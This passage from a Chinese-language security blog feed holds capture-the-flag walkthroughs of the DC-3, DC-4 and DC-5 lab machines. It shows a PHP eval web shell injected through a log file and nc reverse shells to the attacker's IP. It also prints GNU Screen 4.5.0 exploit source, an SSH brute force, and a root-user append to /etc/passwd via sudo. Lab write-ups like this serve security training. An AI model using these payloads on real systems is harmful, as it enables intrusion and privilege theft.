<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
</blockquote>
<p>成功上升为root权限,进入/root得到flag<br><img src="/posts/e38f4498/flag.png"></p>
<br>

<br>

<p>总结</p>
<ul>
<li><p>wpscan爆破</p>
</li>
<li><p>Activity monitor RCE</p>
</li>
<li><p>nc反弹shell</p>
</li>
<li><p>ssh连接</p>
</li>
<li><p>nmap提权</p>
</li>
</ul>
<br>

<br>


<p>Reference</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges5</title>
    <url>/posts/7a861522/</url>
    <content><![CDATA[<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali      192.168.18.131</p>
<p>靶机  192.168.18.136</p>
</blockquote>
<p>nmap扫网段</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
</blockquote>
<p>nmap扫靶机端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
</blockquote>
<p>开放了80、111和60416,80端口使用的nginx</p>
<p>dirsearch扫目录<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
<blockquote>
<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
</blockquote>
<p>进入主页没看到啥提示，只有一个留言板，随便填一下看看有啥东西</p>
<p>抓包发送数据，发现多次发送下面的<code>Copyright © 2019</code>会变化</p>
<p>可以推测使用了footer.php，访问footer.php时年份会改变</p>
<p>访问<code>http://192.168.18.136/footer.php</code>，年份会变化</p>
<p>可以推测thankyou.php包含了footer.php</p>
<p>试一下file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
<p>由于时nginx,访问下他的日志</p>
<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>尝试写入日志文件来反弹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>使用蚁剑连接shell<br><img src="/posts/7a861522/antsword.png"><br>whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
<p>nc命令反弹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
</blockquote>
<p>使用screen</p>
<blockquote>
<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
<hr>
<p> Exploit Title                            |  Path</p>
<hr>
<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
<hr>
<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
</blockquote>
<p>根据说明第一部分保存为<code>libhax.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p>
</blockquote>
<p>第二部分保存为<code>rootshell.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p>
</blockquote>
<p>编译</p>
<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
<p><code>gcc -o rootshell rootshell.c</code></p>
<p>将第三部分保存为exp.sh</p>
<br>

<br>

<p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges4</title>
    <url>/posts/d8125b4/</url>
    <content><![CDATA[<ul>
<li>环境</li>
</ul>
<blockquote>
<p>网段 192.168.18.0/24<br>kali   192.168.18.131<br>靶机 192.168.18.135</p>
</blockquote>
<p>nmap扫描网段</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
</blockquote>
<p>nmap扫描靶机开放的端口</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
</blockquote>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
</blockquote>
<p>进主页看到一个登录框</p>
<p><img src="/posts/d8125b4/index.png"></p>
<p>burp爆破admin得到密码<code>happy</code></p>
<p>登录后发现可以执行一些命令</p>
<p><img src="/posts/d8125b4/command.png"><br>burp抓包看一下<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>反弹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888</p>
</blockquote>
<p>burp改包<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
<p>使用python得到交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 …<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
</blockquote>
<p><code>cat /etc/passwd</code></p>
<p>发现有三个用户</p>
<blockquote>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
</blockquote>
<p>看下charles用户有什么</p>
<blockquote>
<p>**www-data@dc-4:/home$ cd charles **</p>
<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
</blockquote>
<p>查看jim用户有什么,mbox没权限访问</p>
<blockquote>
<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
<p>… … </p>
</blockquote>
<p>把密码保存在dc4_passwd.txt</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
</blockquote>
<p>得到 <code>jim  jibril04</code></p>
<p>连接ssh</p>
<blockquote>
<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;">&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;</a></strong></p>
<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
<p><strong>jim@dc-4:~$ pwd</strong></p>
<p>/home/jim</p>
<p>##看看有什么可以使用的root权限命令</p>
<p><strong>jim@dc-4:~$ sudo -l</strong></p>
<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>

<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw——- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
<p>This is a test.</p>
</blockquote>
<p>可以看到jim发了一条电子邮件</p>
<p>去看一下./var/mail</p>
<blockquote>
<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
<p>Hi Jim,</p>
<p>I’m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
<p>See ya,<br>Charles</p>
<p>**jim@dc-4:/var/mail$ **</p>
</blockquote>
<p>发现了Charles的密码<code>^xHhA&amp;hvim0y</code></p>
<p>su看看能否切换到charles</p>
<blockquote>
<p><strong>jim@dc-4:~$ su charles</strong></p>
<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
</blockquote>
<p>看看Charles有什么可以使用的root命令</p>
<blockquote>
<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
</blockquote>
<p>发现可以不使用密码就能执行<code>teehee</code></p>
<p>搜了一下 可以利用<code>teehee</code>进行提权</p>
<blockquote>
<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
</blockquote>
<p><img src="/posts/d8125b4/teeheeuser.png"></p>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
<p>七个字段</p>
<p>root:x:0:0:root:/root:/bin/bash</p>
<p>Mamor:x:0:0:::/bin/bash</p>
<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
<blockquote>
<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;">&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;">&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;">&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;</a>‘s password: </p>
<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
</blockquote>
<p>构造失败，重新构造一个</p>
<blockquote>
<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
<p>………….</p>
<p>Mamor111::0:0:::/bin/bash</p>
<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  “Y88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88””88b 888 “88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      “   “   “   “<br>888P     Y888  “Y8888  888 888      8888888P”   “Y88P”  888  888  “Y8888  888 888 888 888 </p>
<p>Congratulations!!!</p>
<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
</blockquote>
<br>
<br>

<p>总结</p>
<ul>
<li>nmap扫网段，靶机端口</li>
<li>dirsearch扫目录</li>
<li>burpsuite爆破后台</li>
<li>进入后台发现能执行部分命令并抓包修改发现能命令执行</li>
<li>反弹shell<blockquote>
<p>反弹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burp改包<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>使用python得到交互式shell<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
</blockquote>
</li>
<li>cat /etc/passwd 发现三个用户，并查看信息</li>
<li>ssh用户爆破</li>
<li><strong>teehee提权</strong><blockquote>
<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
</blockquote>
</li>
<li>创建管理员身份并切换</li>
<li>得到flag</li>
</ul>
<br>

<br>

<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>proxychain4配置——虚拟机无法正常走代理</title>
    <url>/posts/45d6c023/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DCchallenges3</title>
    <url>/posts/93e5b017/</url>
    <content><![CDATA[<ul>
<li>环境</li>
</ul>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机 192.168.18.134</p>
</blockquote>
<p>nmap扫描网段</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:09 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00010s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.134<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:83:96:86 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00033s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
</blockquote>
<p>扫描靶机开放端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:11 CST<br>Nmap scan report for 192.168.18.134<br>Host is up (0.0014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:83:96:86 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</p>
</blockquote>
<p>只开放了80端口</p>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
<br>

<p>扫到了管理员登录页面</p>
<p><a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
</blockquote>
<p>打开主页有说明</p>
<blockquote>
<p>Welcome to DC-3.</p>
<p>This time, there is only one flag, one entry point and no clues.</p>
<p>To get the flag, you’ll obviously have to gain root privileges.</p>
<p>How you get to be root is up to you - and, obviously, the system.</p>
<p>Good luck - and I hope you enjoy this little challenge.  :-)</p>
</blockquote>
<p>这次只有一个flag相应得到flag就要得到root权限</p>
<p>访问administrator页面，可以看到是Joomla搭建的平台</p>
<p>在网上搜了下发现有一款JoomScan，安装<code>sudo git clone https://github.com/rezasp/joomscan.git</code></p>
<blockquote>
<p>perl joomscan.pl -u 192.168.18.134  </p>
<p>[+] FireWall Detector<br>[++] Firewall not detected</p>
<p>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0</p>
<p>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable                                                     </p>
<p>[+] Checking Directory Listing<br>[++] directory has directory listing :<br><a href="http://192.168.18.134/administrator/components">http://192.168.18.134/administrator/components</a><br><a href="http://192.168.18.134/administrator/modules">http://192.168.18.134/administrator/modules</a><br><a href="http://192.168.18.134/administrator/templates">http://192.168.18.134/administrator/templates</a><br><a href="http://192.168.18.134/images/banners">http://192.168.18.134/images/banners</a>                                                          </p>
<p>[+] Checking apache info/status files<br>[++] Readable info/status files are not found                                                 </p>
<p>[+] admin finder<br>[++] Admin page : <a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a>                                        </p>
<p>[+] Checking robots.txt existing<br>[++] robots.txt is not found                                                                  </p>
<p>[+] Finding common backup files name<br>[++] Backup files are not found                                                               </p>
<p>[+] Finding common log files name<br>[++] error log is not found                                                                   </p>
<p>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found                                                      </p>
<p>Your Report : reports/192.168.18.134/                                 </p>
</blockquote>
<p>发现Joomal版本为3.7.0</p>
<p>网上搜索相关漏洞发现存在SQL注入</p>
<br>

<blockquote>
<p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
<hr>
<p> Exploit Title                                              |  Path</p>
<hr>
<p>Joomla! 3.7.0 - ‘com_fields’ SQL Injection                  | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
